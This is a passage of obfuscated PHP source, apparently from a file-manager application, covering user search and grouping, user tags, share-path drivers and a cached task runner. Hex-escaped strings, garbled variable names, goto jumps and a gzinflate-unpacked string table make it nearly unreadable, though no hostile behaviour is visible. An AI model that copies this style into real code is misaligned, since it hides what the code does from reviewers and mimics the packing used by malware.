array_sort_keep($“ìş£˜‚ , $Œø¾[1582], $Œõ“Ë); $this->_listDataApply($“ìş£˜‚ ); return $“ìş£˜‚ ; } public function listByGroup($ƒ•× Ü†÷à = 0, $…¸±æ = array()) { $§ïß¹ =& $_SERVER[èÍ×öˆøÉ]; $ä‘ò§â‡•Ş† = $§ïß¹[33]; $ö¦„ó© = array(); if ($ƒ•× Ü†÷à) { $ö¦„ó© = array($§ïß¹[2214] => intval($ƒ•× Ü†÷à)); $ä‘ò§â‡•Ş† = "\x4c\105\x46\124\40\112\x4f\x49\116\x20{$this->tablePrefix}\x75\x73\x65\162\137\147\162\157\165\160\x20\x75\163\145\162\137\x67\x72\157\x75\x70\40\x6f\x6e\40\x75\x73\145\x72\56\x75\x73\x65\x72\x49\x44\x20\75\40\165\163\145\162\137\147\x72\157\x75\160\56\x75\x73\145\162\x49\104"; $ÔûĞÄû÷ = Input::get($§ïß¹[449], null, $§ïß¹[33]) ? $§ïß¹[33] : $§ïß¹[2215]; } if (isset($…¸±æ[$§ïß¹[745]])) { $ö¦„ó©[$§ïß¹[2216]] = $…¸±æ[$§ïß¹[745]]; } $™Ä = $this->_makeOrder($ÔûĞÄû÷)->field($§ïß¹[2217])->where($ö¦„ó©)->join($ä‘ò§â‡•Ş†)->selectPage(50); $this->_listDataApply($™Ä[$§ïß¹[367]]); return $™Ä; } private function _makeOrder($úÅÍ = '') { $ö­–‹Š =& $_SERVER[èÍ×öˆøÉ]; $Â = array($ö­–‹Š[1582], $ö­–‹Š[28], $ö­–‹Š[1737], $ö­–‹Š[1709], $ö­–‹Š[194]); $›ó•¸ = array($ö­–‹Š[442] => $ö­–‹Š[443], $ö­–‹Š[444] => $ö­–‹Š[445]); $–£‰ö = Input::get($ö­–‹Š[449], $ö­–‹Š[7], $ö­–‹Š[1573], $Â); $ñ¢ñï = Input::get($ö­–‹Š[450], $ö­–‹Š[7], $ö­–‹Š[1839], array($ö­–‹Š[1839], $ö­–‹Š[444])); $ñ¢ñï = $›ó•¸[$ñ¢ñï]; $úÅÍ = $úÅÍ . "\165\163\145\162\x2e{$–£‰ö}\40{$ñ¢ñï}\x2c\40\165\163\x65\162\x2e\165\x73\145\162\x49\104\x20\141\163\143"; return $this->alias($ö­–‹Š[1959])->order($úÅÍ); } public function listSearch($ İÄ«äÚ) { $ç’¯¦ä²Ãé¸ =& $_SERVER[èÍ×öˆøÉ]; $ø¡ú“½É¼ = $ İÄ«äÚ[$ç’¯¦ä²Ãé¸[1840]]; $ÈÙØÇ‰ = isset($ İÄ«äÚ[$ç’¯¦ä²Ãé¸[1841]]) ? $ İÄ«äÚ[$ç’¯¦ä²Ãé¸[1841]] : !1; $ø¡ú“½É¼ = str_replace($ç’¯¦ä²Ãé¸[1842], $ç’¯¦ä²Ãé¸[1843], trim($ø¡ú“½É¼)); $şÈ = array($ç’¯¦ä²Ãé¸[28] => array($ç’¯¦ä²Ãé¸[381], "\x25{$ø¡ú“½É¼}\45"), $ç’¯¦ä²Ãé¸[303] => array($ç’¯¦ä²Ãé¸[381], "{$ø¡ú“½É¼}\45"), $ç’¯¦ä²Ãé¸[2017] => array($ç’¯¦ä²Ãé¸[381], "{$ø¡ú“½É¼}\45"), $ç’¯¦ä²Ãé¸[997] => $ç’¯¦ä²Ãé¸[1844]); if (Input::check($ø¡ú“½É¼, $ç’¯¦ä²Ãé¸[309])) { $şÈ[$ç’¯¦ä²Ãé¸[1582]] = array($ç’¯¦ä²Ãé¸[381], "{$ø¡ú“½É¼}\45"); $şÈ[$ç’¯¦ä²Ãé¸[2198]] = array($ç’¯¦ä²Ãé¸[381], "{$ø¡ú“½É¼}\x25"); } if (!$ø¡ú“½É¼) { $şÈ = array(); } if (isset($ İÄ«äÚ[$ç’¯¦ä²Ãé¸[745]])) { $şÈ[$ç’¯¦ä²Ãé¸[745]] = $ İÄ«äÚ[$ç’¯¦ä²Ãé¸[745]]; } $şÈ = $this->parseWhereLike($şÈ); $­´ = $this->_makeOrder()->where($şÈ)->selectPage(20); if (!$­´ || count($­´[$ç’¯¦ä²Ãé¸[367]]) < 5 && Input::check($ø¡ú“½É¼, $ç’¯¦ä²Ãé¸[316])) { $á€éİ = $this->_searchFromMeta($ç’¯¦ä²Ãé¸[457], $ø¡ú“½É¼, 10); $ù“Ã§ôÜ¯ = $this->_searchFromMeta($ç’¯¦ä²Ãé¸[458], $ø¡ú“½É¼, 10); $Êó = array_merge($á€éİ, $ù“Ã§ôÜ¯, $­´[$ç’¯¦ä²Ãé¸[367]]); $­´[$ç’¯¦ä²Ãé¸[367]] = array_unique_by_key($Êó, $ç’¯¦ä²Ãé¸[1582]); $­´[$ç’¯¦ä²Ãé¸[364]][$ç’¯¦ä²Ãé¸[365]] = count($­´[$ç’¯¦ä²Ãé¸[367]]); $­´[$ç’¯¦ä²Ãé¸[364]][$ç’¯¦ä²Ãé¸[366]] = ceil($­´[$ç’¯¦ä²Ãé¸[364]][$ç’¯¦ä²Ãé¸[365]] / $­´[$ç’¯¦ä²Ãé¸[364]][$ç’¯¦ä²Ãé¸[361]]); } $this->_listDataApply($­´[$ç’¯¦ä²Ãé¸[367]]); $this->_filterByGroup($­´, $ÈÙØÇ‰); return $­´; } private function _filterByGroup(&$á”†š•Ñí, $ ã˜‰½¬¯É) { $òËƒ‡ß´¥Ù =& $_SERVER[èÍ×öˆøÉ]; if (!$ ã˜‰½¬¯É) { return $á”†š•Ñí; } foreach ($á”†š•Ñí[$òËƒ‡ß´¥Ù[367]] as $ŸÛ => &$İñó˜é¹‘š) { $ëß = array_to_keyvalue($İñó˜é¹‘š[$òËƒ‡ß´¥Ù[1929]], $òËƒ‡ß´¥Ù[33], $òËƒ‡ß´¥Ù[1749]); if (!in_array($ ã˜‰½¬¯É, $ëß)) { unset($á”†š•Ñí[$òËƒ‡ß´¥Ù[367]][$ŸÛ]); } } unset($İñó˜é¹‘š); $á”†š•Ñí[$òËƒ‡ß´¥Ù[367]] = array_values($á”†š•Ñí[$òËƒ‡ß´¥Ù[367]]); $á”†š•Ñí[$òËƒ‡ß´¥Ù[364]] = array($òËƒ‡ß´¥Ù[1991] => count($á”†š•Ñí[$òËƒ‡ß´¥Ù[367]]), $òËƒ‡ß´¥Ù[1989] => $á”†š•Ñí[$òËƒ‡ß´¥Ù[364]][$òËƒ‡ß´¥Ù[361]], $òËƒ‡ß´¥Ù[1988] => 1, $òËƒ‡ß´¥Ù[1990] => 1); } private function _searchFromMeta($Ñ€×¥´, $¹´§ª”õƒ, $ş÷Á™) { $Æ»Œß‰ßÒ =& $_SERVER[èÍ×öˆøÉ]; $¹´§ª”õƒ = strtolower($¹´§ª”õƒ); $›©¾—¥÷ıÃ = array($Æ»Œß‰ßÒ[93] => $Ñ€×¥´, $Æ»Œß‰ßÒ[372] => array($Æ»Œß‰ßÒ[381], "\45{$¹´§ª”õƒ}\x25")); $›©¾—¥÷ıÃ = $this->parseWhereLike($›©¾—¥÷ıÃ); $ÒÁÏÒÉÒ = Model($Æ»Œß‰ßÒ[2218])->where($›©¾—¥÷ıÃ)->limit($ş÷Á™)->select(); if (!$ÒÁÏÒÉÒ) { return array(); } $ÒÁÏÒÉÒ = array_to_keyvalue($ÒÁÏÒÉÒ, $Æ»Œß‰ßÒ[33], $Æ»Œß‰ßÒ[1582]); $Ö”Ì = $this->where(array($Æ»Œß‰ßÒ[1573] => array($Æ»Œß‰ßÒ[7], $ÒÁÏÒÉÒ)))->select(); if (!$Ö”Ì) { return array(); } return $Ö”Ì; } private function _listDataApplyItem($ìÕÊœÌà¹) { $À»­² = array($ìÕÊœÌà¹); $this->_listDataApply($À»­²); return $À»­²[0]; } private function _listDataApply(&$ÇØ²ğ) { $ŸÇêĞ¼¸Š¥ =& $_SERVER[èÍ×öˆøÉ]; if (!$ÇØ²ğ) { return; } array_remove_key($ÇØ²ğ, $ŸÇêĞ¼¸Š¥[889]); $‚ÇÀó¡ÎıêÅ = array_to_keyvalue($ÇØ²ğ, $ŸÇêĞ¼¸Š¥[33], $ŸÇêĞ¼¸Š¥[1582]); $this->_listAppendGroup($ÇØ²ğ, $‚ÇÀó¡ÎıêÅ); $this->_listAppendMeta($ÇØ²ğ, $‚ÇÀó¡ÎıêÅ); $this->_listAppendSourceRoot($ÇØ²ğ, $‚ÇÀó¡ÎıêÅ); } private function _listAppendSourceRoot(&$Ø¼¸, $„ÒÀÌÖ„) { $İ­ÆÃÚô¹Ö”¡ =& $_SERVER[èÍ×öˆøÉ]; $¢Ãëİò«ÚÄà = array($İ­ÆÃÚô¹Ö”¡[492] => 0, $İ­ÆÃÚô¹Ö”¡[498] => array($İ­ÆÃÚô¹Ö”¡[7], $„ÒÀÌÖ„), $İ­ÆÃÚô¹Ö”¡[406] => SourceModel::TYPE_USER); $ßÏ¬‚ó = Model($İ­ÆÃÚô¹Ö”¡[827])->order($İ­ÆÃÚô¹Ö”¡[1850])->field($İ­ÆÃÚô¹Ö”¡[1851]); $ĞòË = $ßÏ¬‚ó->limit(count($„ÒÀÌÖ„))->where($¢Ãëİò«ÚÄà)->select(); $ĞòË = array_to_keyvalue($ĞòË, $İ­ÆÃÚô¹Ö”¡[498]); $ĞòË = array_remove_key($ĞòË, $İ­ÆÃÚô¹Ö”¡[498]); foreach ($Ø¼¸ as &$Ìø­¤âË¨) { $Ìø­¤âË¨[$İ­ÆÃÚô¹Ö”¡[85]] = $ĞòË[$Ìø­¤âË¨[$İ­ÆÃÚô¹Ö”¡[1582]]] ? $ĞòË[$Ìø­¤âË¨[$İ­ÆÃÚô¹Ö”¡[1582]]] : array(); } unset($Ìø­¤âË¨); } private function _listAppendGroup(&$Á÷ÛÍ¿Ù, $ø¿Æ³) { $§ÒÎ§í® =& $_SERVER[èÍ×öˆøÉ]; $‚Òô”œ¦±ñ» = array($§ÒÎ§í®[1582] => array($§ÒÎ§í®[7], $ø¿Æ³)); $¢óàë¡Ø = Model($§ÒÎ§í®[1838])->where($‚Òô”œ¦±ñ»)->select(); $´Ñ”¨ıƒ«¥ = array_to_keyvalue($¢óàë¡Ø, $§ÒÎ§í®[33], $§ÒÎ§í®[1749]); $´Ñ”¨ıƒ«¥ = array_remove_value(array_unique($´Ñ”¨ıƒ«¥), $§ÒÎ§í®[191]); if (!$´Ñ”¨ıƒ«¥ || !$¢óàë¡Ø) { return; } $‚Òô”œ¦±ñ» = array($§ÒÎ§í®[1749] => array($§ÒÎ§í®[7], $´Ñ”¨ıƒ«¥)); $ÖÒÚÈ—î = Model($§ÒÎ§í®[1927])->field($§ÒÎ§í®[2219])->where($‚Òô”œ¦±ñ»)->select(); $ÖÒÚÈ—î = array_to_keyvalue($ÖÒÚÈ—î, $§ÒÎ§í®[1749]); $¢óàë¡Ø = array_to_keyvalue_group($¢óàë¡Ø, $§ÒÎ§í®[1582]); foreach ($¢óàë¡Ø as &$Õ°®ĞúÀò) { $ÆÚÓ”ÑÆù¼ = array(); foreach ($Õ°®ĞúÀò as $«Üµ¯) { if (!$«Üµ¯[$§ÒÎ§í®[1852]]) { continue; } $•‡®ˆâ× = Model($§ÒÎ§í®[501])->listData($«Üµ¯[$§ÒÎ§í®[1852]]); $ÆÚÓ”ÑÆù¼[] = array($§ÒÎ§í®[1749] => $«Üµ¯[$§ÒÎ§í®[1749]], $§ÒÎ§í®[2220] => $ÖÒÚÈ—î[$«Üµ¯[$§ÒÎ§í®[1749]]][$§ÒÎ§í®[28]], $§ÒÎ§í®[515] => $ÖÒÚÈ—î[$«Üµ¯[$§ÒÎ§í®[1749]]][$§ÒÎ§í®[515]], $§ÒÎ§í®[408] => $•‡®ˆâ×); } $Õ°®ĞúÀò = $ÆÚÓ”ÑÆù¼; } unset($Õ°®ĞúÀò); foreach ($Á÷ÛÍ¿Ù as &$€ø€­Ø) { $€ø€­Ø[$§ÒÎ§í®[1929]] = array(); if (isset($¢óàë¡Ø[$€ø€­Ø[$§ÒÎ§í®[1582]]])) { $€ø€­Ø[$§ÒÎ§í®[1929]] = $¢óàë¡Ø[$€ø€­Ø[$§ÒÎ§í®[1582]]]; } } unset($€ø€­Ø); } public function userAppendGroup($ÌÛ) { $¤Ï¢³ÇëÒê =& $_SERVER[èÍ×öˆøÉ]; if (!$ÌÛ) { return array(); } $this->_listAppendGroup($ÌÛ, array_to_keyvalue($ÌÛ, $¤Ï¢³ÇëÒê[33], $¤Ï¢³ÇëÒê[1582])); return $ÌÛ; } private function _listAppendMeta(&$¦ÅÀÀùÇÀÃö, $í´†) { $²åó =& $_SERVER[èÍ×öˆøÉ]; $‡Î = UserJobModel::JOB_KEY; $ËÅ·â†³¸Ø¤ = array($²åó[2199]); $ÊğÍ«ìê = array($²åó[1582] => array($²åó[7], $í´†)); $©ŸíÒåÉˆ› = Model($²åó[2197])->where($ÊğÍ«ìê)->select(); $©ŸíÒåÉˆ› = array_to_keyvalue_group($©ŸíÒåÉˆ›, $²åó[1582]); foreach ($©ŸíÒåÉˆ› as &$°à) { $‡ù¨É’Ê²ƒ = array(); foreach ($°à as $ú‰»Ø¤ëªÔ) { if (!in_array($ú‰»Ø¤ëªÔ[$²åó[93]], $ËÅ·â†³¸Ø¤)) { $‡ù¨É’Ê²ƒ[$ú‰»Ø¤ëªÔ[$²åó[93]]] = $ú‰»Ø¤ëªÔ[$²åó[372]]; } } $°à = $‡ù¨É’Ê²ƒ; } unset($°à); $ ğ£Ÿ”÷©ä¥ = Model($²åó[2221]); foreach ($¦ÅÀÀùÇÀÃö as &$”ëí”ô) { $‘¾©Çà = array(); if (isset($©ŸíÒåÉˆ›[$”ëí”ô[$²åó[1582]]])) { $‘¾©Çà = $©ŸíÒåÉˆ›[$”ëí”ô[$²åó[1582]]]; } $”ëí”ô[$²åó[2222]] = array(); if (isset($‘¾©Çà[$‡Î])) { $”ëí”ô[$²åó[2222]] = $ ğ£Ÿ”÷©ä¥->getUserJobInfo($‘¾©Çà[$‡Î]); } } unset($”ëí”ô); } protected function groupUserAll($õŸÉóÜ­ºâÄ) { $ğ‡Êí÷» =& $_SERVER[èÍ×öˆøÉ]; if (!$õŸÉóÜ­ºâÄ) { return !1; } $õÙµÊœ‚¿Ø = Model($ğ‡Êí÷»[1838])->field($ğ‡Êí÷»[1582])->where(array($ğ‡Êí÷»[1749] => array($ğ‡Êí÷»[7], $õŸÉóÜ­ºâÄ)))->select(); $õÙµÊœ‚¿Ø = array_to_keyvalue($õÙµÊœ‚¿Ø, $ğ‡Êí÷»[33], $ğ‡Êí÷»[1582]); return array_unique($õÙµÊœ‚¿Ø); } public function userSearch($·Ü, $ÍÏ‘ÕÜ‹å = "\52") { return Model($_SERVER[èÍ×öˆøÉ][532])->where($·Ü)->field($ÍÏ‘ÕÜ‹å)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\x72\x5f\x6f\x70\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Œ’´ÅË°Ñ­Şº) { $§â÷Šç“ù =& $_SERVER[èÍ×öˆøÉ]; if (!defined($§â÷Šç“ù[468])) { define($§â÷Šç“ù[468], 0); } return "\125\x73\x65\x72\117\160\x74\x69\x6f\156\x5f{$Œ’´ÅË°Ñ­Şº}\x5f" . USER_ID; } protected function filterWhere($ú•Í) { $äÊ =& $_SERVER[èÍ×öˆøÉ]; if (!defined($äÊ[468])) { define($äÊ[468], 0); } $ú•Í[$äÊ[1582]] = USER_ID; return $ú•Í; } public function cacheRemoveUser($ˆÉı¾°©®ô, $ÜåŠ÷) { return Cache::remove("\125\163\x65\162\117\x70\x74\151\x6f\x6e\x5f{$ˆÉı¾°©®ô}\x5f" . $ÜåŠ÷); } protected function optionDefault($²Áªí®—êı´ = '') { $ñ‰Ş½± =& $_SERVER[èÍ×öˆøÉ]; if ($²Áªí®—êı´ == $ñ‰Ş½±[33]) { return $GLOBALS[$ñ‰Ş½±[6]][$ñ‰Ş½±[2223]]; } if ($²Áªí®—êı´ == $ñ‰Ş½±[2224]) { return $GLOBALS[$ñ‰Ş½±[6]][$ñ‰Ş½±[2225]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\162\x2e\164\141\147\x4c\151\x73\x74"; public $modelType = "\125\x73\145\x72\x4f\160\164\151\157\x6e"; public $field = array("\156\x61\155\x65", "\x73\x74\171\154\x65", "\x73\157\162\164"); public function listData($ÙŠñŒ¾Ú‘…… = false, $µÒ¯ãà = "\x73\x6f\162\x74", $ÅŸ¦î = false) { return parent::listData($ÙŠñŒ¾Ú‘……, $µÒ¯ãà, $ÅŸ¦î); } public function remove($ÌÖ‡öÃµˆû) { return parent::remove($ÌÖ‡öÃµˆû); } public function add($İ…â, $¬ßä½Ã = "\x6c\x61\142\x65\154\x2d\x67\x72\145\x79\x2d\156\157\x72\x6d\141\x6c") { $®ã…âËıº·Ö =& $_SERVER[èÍ×öˆøÉ]; if ($this->findByName($İ…â)) { return !1; } $Ø°†åªÑ‹ª = array($®ã…âËıº·Ö[415] => $İ…â, $®ã…âËıº·Ö[478] => $¬ßä½Ã, $®ã…âËıº·Ö[1753] => $this->getSort($®ã…âËıº·Ö[256]) + 1); return parent::insert($Ø°†åªÑ‹ª); } public function update($—Õ, $®¨åÃ‡) { $ï©øÓ =& $_SERVER[èÍ×öˆøÉ]; $› = $this->listData($—Õ); $‹¸ = $this->findByName($®¨åÃ‡[$ï©øÓ[28]]); if (!$› || $‹¸ && $‹¸[$ï©øÓ[395]] != $›[$ï©øÓ[395]]) { return !1; } return parent::update($—Õ, $®¨åÃ‡); } public function moveTop($ä‚Ìáıä) { $ÚÒÒÙÁğØ =& $_SERVER[èÍ×öˆøÉ]; $ú¼óˆâ€“ = parent::listData(); $‘¡ = $this->getSort($ÚÒÒÙÁğØ[255]); foreach ($ú¼óˆâ€“ as &$Î¯€½ìšİß·) { if ($Î¯€½ìšİß·[$ÚÒÒÙÁğØ[395]] == $ä‚Ìáıä) { $Î¯€½ìšİß·[$ÚÒÒÙÁğØ[1772]] = $‘¡; continue; } $Î¯€½ìšİß·[$ÚÒÒÙÁğØ[1772]] += 1; } unset($Î¯€½ìšİß·); return parent::resetData($ú¼óˆâ€“); } public function moveBottom($ïáò€) { $†ôˆ˜Áë =& $_SERVER[èÍ×öˆøÉ]; $Ëù = $this->getSort($†ôˆ˜Áë[256]) + 1; return parent::update($ïáò€, array($†ôˆ˜Áë[1772] => $Ëù)); } public function resetSort($×‹©ì) { $‘¶ =& $_SERVER[èÍ×öˆøÉ]; $»›Û€âƒÌ¹ = array(); $×‹©ì = is_array($×‹©ì) ? $×‹©ì : array(); for ($é‚¥ò§Ò³‹ı = 0; $é‚¥ò§Ò³‹ı < count($×‹©ì); $é‚¥ò§Ò³‹ı++) { $»›Û€âƒÌ¹[$×‹©ì[$é‚¥ò§Ò³‹ı] . $‘¶[33]] = $é‚¥ò§Ò³‹ı + 1; } $£€´— = parent::listData(); foreach ($£€´— as &$üÎ÷åî†æ¥) { $í¥Ù¨ = $»›Û€âƒÌ¹[$üÎ÷åî†æ¥[$‘¶[395]]]; $üÎ÷åî†æ¥[$‘¶[1772]] = $í¥Ù¨ ? $í¥Ù¨ : $üÎ÷åî†æ¥[$‘¶[1772]]; } unset($üÎ÷åî†æ¥); return parent::resetData($£€´—); } private function getSort($ğú±ÇÈ) { $£Ø…Êà =& $_SERVER[èÍ×öˆøÉ]; $±áÏ²˜‘ = parent::listData(); $¢÷™²‚ = array_to_keyvalue($±áÏ²˜‘, $£Ø…Êà[33], $£Ø…Êà[1772]); if (!$¢÷™²‚) { $¢÷™²‚ = array(0); } $¸…ü«Œ = $ğú±ÇÈ == $£Ø…Êà[256] ? max($¢÷™²‚) : min($¢÷™²‚); return intval($¸…ü«Œ); } } goto e‹ß¥µÅ; DÇâÖÀ§¢ä: class PathDriverDriverShareItem { public function __construct($ˆöĞîà™) { $this->pathParse = $ˆöĞîà™; } public function __call($š¡, $ŠŞÊƒö»Éä) { $¸¶ =& $_SERVER[èÍ×öˆøÉ]; if (method_exists($this, $š¡)) { return; } $Î¹á…ƒßûÜ = call_user_func_array(array($¸¶[1265], $š¡), $ŠŞÊƒö»Éä); $¢²æıÓ«ç = array($¸¶[1266], $¸¶[1267], $¸¶[1268], $¸¶[1269], $¸¶[543], $¸¶[545], $¸¶[1270], $¸¶[107], $¸¶[1271], $¸¶[1272]); if (in_array($š¡, $¢²æıÓ«ç)) { $Î¹á…ƒßûÜ = $this->getPathOuter($Î¹á…ƒßûÜ); } return $Î¹á…ƒßûÜ; } public function copy($÷§ãË»ˆ, $©š, $‹ŞÛ¹ = false) { return $this->copyMove($÷§ãË»ˆ, $©š, $‹ŞÛ¹, $_SERVER[èÍ×öˆøÉ][543]); } public function move($˜Á, $Æ‡°, $©œÜòúÔáª² = false) { return $this->copyMove($˜Á, $Æ‡°, $©œÜòúÔáª², $_SERVER[èÍ×öˆøÉ][545]); } private function copyMove($İá¯, $¬ğÙßŒÆııÇ, $¹»Ì, $ñÚï—) { $“ã» =& $_SERVER[èÍ×öˆøÉ]; $ÎüÉŸØôô˜ = $¬ğÙßŒÆııÇ; $Ì¼“ß« = IO::driverMake($¬ğÙßŒÆııÇ); if ($Ì¼“ß«->pathParse[$“ã»[1086]]) { $¬ğÙßŒÆııÇ = $Ì¼“ß«->pathParse[$“ã»[1086]]; } else { $¬ğÙßŒÆııÇ = $ÎüÉŸØôô˜; } $™üÔ¯ŸÙú½‡ = IO::copyMove($İá¯, $¬ğÙßŒÆııÇ, $¹»Ì, $ñÚï—); $™üÔ¯ŸÙú½‡ = $this->getPathOuter($™üÔ¯ŸÙú½‡); return $™üÔ¯ŸÙú½‡; } public function pathThis($¨ÕÑ¯­ôİß) { return get_path_this($this->pathParse[$_SERVER[èÍ×öˆøÉ][76]]); } public function pathFather($ğ¨’˜) { return get_path_father($this->pathParse[$_SERVER[èÍ×öˆøÉ][76]]); } public function iconvSystem($¿ñ) { return $¿ñ; } protected function infoParse($ßèº±™ûûî , $ó”ô–Ê = false) { $»ºçÕ«»–ºµ =& $_SERVER[èÍ×öˆøÉ]; $´Ì„ˆ = $this->pathParse[$»ºçÕ«»–ºµ[480]][$»ºçÕ«»–ºµ[1109]] . $this->pathParse[$»ºçÕ«»–ºµ[1102]]; if ($ó”ô–Ê) { $å¿€² = IO::infoWithChildren($´Ì„ˆ); } else { $å¿€² = IO::info($´Ì„ˆ); } $¿’æâ‡ = $this->pathParse[$»ºçÕ«»–ºµ[480]]; return Action($»ºçÕ«»–ºµ[1264])->_shareItemeParse($å¿€², $¿’æâ‡); } public function listAll($¾¿‰Á¡) { $¹¢Ï©í =& $_SERVER[èÍ×öˆøÉ]; $£ÄèÈ€ĞŸÙ = IO::listAll($¾¿‰Á¡); $Áæ×¨™É‡Ó = $this->pathParse[$¹¢Ï©í[480]]; foreach ($£ÄèÈ€ĞŸÙ as &$ë‚æĞ’’Îœ–) { check_abort(); $‡À = IO::info($ë‚æĞ’’Îœ–[$¹¢Ï©í[76]]); $‡À = is_array($‡À) ? $‡À : array(); $ë‚æĞ’’Îœ– = array_merge($‡À, $ë‚æĞ’’Îœ–); $ë‚æĞ’’Îœ–[$¹¢Ï©í[85]] = Action($¹¢Ï©í[1264])->_shareItemeParse($ë‚æĞ’’Îœ–, $Áæ×¨™É‡Ó); } unset($ë‚æĞ’’Îœ–); return $£ÄèÈ€ĞŸÙ; } public function getPathOuter($ÃÄ) { $˜ñ•ÑÔ =& $_SERVER[èÍ×öˆøÉ]; $ªíÎöğôóÅ = KodIO::parse($ÃÄ); if ($ªíÎöğôóÅ[$˜ñ•ÑÔ[29]] == KodIO::KOD_SHARE_ITEM) { return $ªíÎöğôóÅ[$˜ñ•ÑÔ[76]]; } $ØÆ = KodIO::clear($ÃÄ); $ç˜Îó = KodIO::clear($this->pathParse[$˜ñ•ÑÔ[480]][$˜ñ•ÑÔ[1109]]); $ñ½â = substr($ØÆ, strlen($ç˜Îó)); if (substr($ØÆ, 0, strlen($ç˜Îó)) != $ç˜Îó) { return !1; } return $this->pathParse[$˜ñ•ÑÔ[1103]] . $˜ñ•ÑÔ[8] . ltrim($ñ½â, $˜ñ•ÑÔ[8]); } public function getType() { $ÓÕ›É”º =& $_SERVER[èÍ×öˆøÉ]; $Œı¢ = str_replace($ÓÕ›É”º[72], $ÓÕ›É”º[33], get_class($this)); return strtolower($Œı¢); } public function isTypeObject($ÏÌæØèÁøÚô˜) { return IO::isTypeObject($ÏÌæØèÁøÚô˜); } public function info($¤è) { return $this->infoParse($¤è); } public function infoAuth($¨) { return $this->infoParse($¨); } public function infoWithChildren($óŸ) { return $this->infoParse($óŸ, !0); } public function infoFull($˜ñ–£) { return $this->infoParse($˜ñ–£); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($´›Ä) { $this->pathParse = $´›Ä; } protected function infoParse($Ñ÷³¥À§, $éŞ± = false) { $¶¬Ïãíºß­® =& $_SERVER[èÍ×öˆøÉ]; return Action($¶¬Ïãíºß­®[1108])->sharePathInfo($this->pathParse[$¶¬Ïãíºß­®[76]], !0, $éŞ±); } public function listPath($ìõ, $·äìİŸÎ = false) { $ú–ï =& $_SERVER[èÍ×öˆøÉ]; $Ë = IO::listPath($ìõ, $·äìİŸÎ); foreach ($Ë as $Áˆ³ª‚¾ => $‡œ‡) { if (!in_array($Áˆ³ª‚¾, array($ú–ï[74], $ú–ï[75]))) { continue; } foreach ($‡œ‡ as $È«‘™â°› => $‘Í…Ï‹à) { $‘Í…Ï‹à = Action($ú–ï[1273])->parsePathChildren($‘Í…Ï‹à, array($ú–ï[416] => $ìõ)); $Ë[$Áˆ³ª‚¾][$È«‘™â°›] = Action($ú–ï[1108])->shareItemInfo($‘Í…Ï‹à); } } return $Ë; } public function listAll($’ÂÊ¼è°) { $’ú•ĞÈÆ =& $_SERVER[èÍ×öˆøÉ]; $»îï = IO::listAll($’ÂÊ¼è°); foreach ($»îï as &$ñ¯ÄòºÛÄ) { $Ï³®½ = IO::info($ñ¯ÄòºÛÄ[$’ú•ĞÈÆ[76]]); $Ï³®½ = is_array($Ï³®½) ? $Ï³®½ : array(); $ñ¯ÄòºÛÄ = array_merge($Ï³®½, $ñ¯ÄòºÛÄ); $ñ¯ÄòºÛÄ[$’ú•ĞÈÆ[85]] = Action($’ú•ĞÈÆ[1108])->shareItemInfo($ñ¯ÄòºÛÄ); } unset($ñ¯ÄòºÛÄ); return $»îï; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($ºÄ‹Òê ¾÷) { parent::__construct($ºÄ‹Òê ¾÷); } } goto fêÒó÷©ÚĞ; B¨Ä°½°øÕ: define($_SERVER[èÍ×öˆøÉ][0], $_SERVER[èÍ×öˆøÉ][1]); $_SERVER[©ÚŸ÷»ïé] = explode($_SERVER[èÍ×öˆøÉ][2], gzinflate(substr($_SERVER[èÍ×öˆøÉ][3], 10, -8))); function binCheckEq($ê¢òüÃ½, $Ğ¾ÜªÙÒŸ ¤›) { return $ê¢òüÃ½ == $Ğ¾ÜªÙÒŸ ¤›; } goto B¦Œ˜Òá¥; f„Ÿ»Ûö“İ: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($‹¼Ş, $Œ½©ÖÓ¡£Á = 5.0) { if (!$‹¼Ş) { return; } $ÙŞúûÎš’Ñ = Cache::get($‹¼Ş); if (!$ÙŞúûÎš’Ñ || timeFloat() - floatVal($ÙŞúûÎš’Ñ) >= $Œ½©ÖÓ¡£Á) { Cache::set($‹¼Ş, timeFloat(), $Œ½©ÖÓ¡£Á * 10); return !0; } return !1; } public static function timeLimitCall($ûë¬Î, $· İÛ, $…‰ö, $Ö†È“ƒù† = 5.0) { $µÛ¦ =& $_SERVER[èÍ×öˆøÉ]; if (!$ûë¬Î || !$· İÛ) { return; } self::$asyncAdd = !0; $şë‚¯ = $µÛ¦[1662]; $Ãµ = Cache::get($şë‚¯, !0); $åâëæÙÌ‡ = array($µÛ¦[1663] => timeFloat(), $µÛ¦[1664] => timeFloat(), $µÛ¦[262] => $· İÛ, $µÛ¦[1657] => $…‰ö, $µÛ¦[197] => $Ö†È“ƒù†); if (is_array($Ãµ[$ûë¬Î])) { $åâëæÙÌ‡[$µÛ¦[1664]] = $Ãµ[$ûë¬Î][$µÛ¦[1664]]; } if (is_array($Ãµ[$ûë¬Î])) { if (timeFloat() - $Ãµ[$ûë¬Î][$µÛ¦[1663]] < $åâëæÙÌ‡[$µÛ¦[197]] * 0.3) { return; } $åâëæÙÌ‡[$µÛ¦[1664]] = $Ãµ[$ûë¬Î][$µÛ¦[1664]]; } $Ãµ[$ûë¬Î] = $åâëæÙÌ‡; Cache::set($şë‚¯, $Ãµ, 60); Cache::removeMemory($şë‚¯); write_log($µÛ¦[1665] . $ûë¬Î . $µÛ¦[68] . $· İÛ, $µÛ¦[1659]); } public static function timeLimitCallLoop() { $½şŠ =& $_SERVER[èÍ×öˆøÉ]; $ãŠø¿É  = array($½şŠ[1666]); $ß¯ = in_array(strtolower(ACTION), $ãŠø¿É ); if (!$ß¯ && !self::$asyncAdd) { return; } $ƒöï³Ì—÷ = $½şŠ[1662]; $Ç±£…«Ëç = Cache::get($ƒöï³Ì—÷, !0); if (!$Ç±£…«Ëç || count($Ç±£…«Ëç) <= 0) { return; } $Ìí = !1; $åº«…ÏÑÕá = timeFloat(); $…€˜Â™ª½©Ö = array(); foreach ($Ç±£…«Ëç as $Åî©´é => $†Àé) { if ($åº«…ÏÑÕá - $†Àé[$½şŠ[1664]] > $†Àé[$½şŠ[197]]) { $Ìí = !0; try { Hook::apply($†Àé[$½şŠ[262]], $†Àé[$½şŠ[1657]]); write_log($½şŠ[1667] . $Åî©´é . $½şŠ[68] . 